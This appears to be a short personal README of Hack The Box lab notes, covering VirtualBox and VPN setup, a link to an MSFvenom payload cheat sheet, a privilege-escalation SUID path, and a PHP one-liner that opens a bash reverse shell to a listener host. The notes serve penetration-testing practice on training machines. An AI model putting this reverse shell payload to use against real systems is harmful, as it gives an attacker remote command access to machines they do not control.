# HTB-Note
note about Hack The Box

## Virtual Box Setting

### Run GuestAddictionsCD

```Shell
cd /media/
sudo mount /dev/cdrom /media/cdrom1
cd /cdrom1
sudo ./VBoxLinuxAdditions.run 
reboot
```

### Open VPN

- Download ovpn file **for VIP account**

```Shell
sudo openvpn --config ./Desktop/yufujioka.ovpn
```

## CheatShhet

### MSFvenom

- [MSFvenom ~ ペイロード早見表 ~](https://qiita.com/mr-wacker/items/0ec926951ffa5a4d197c)

### Reverse Shell

- [A tiny PHP/bash reverse shell.](https://gist.github.com/rshipp/eee36684db07d234c1cc#gistcomment-3100663)
```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.0.10/1234 0>&1'");
```

### Privilege escalation

#### find SUID 

```shell
/var/htb/bin/emergency
```
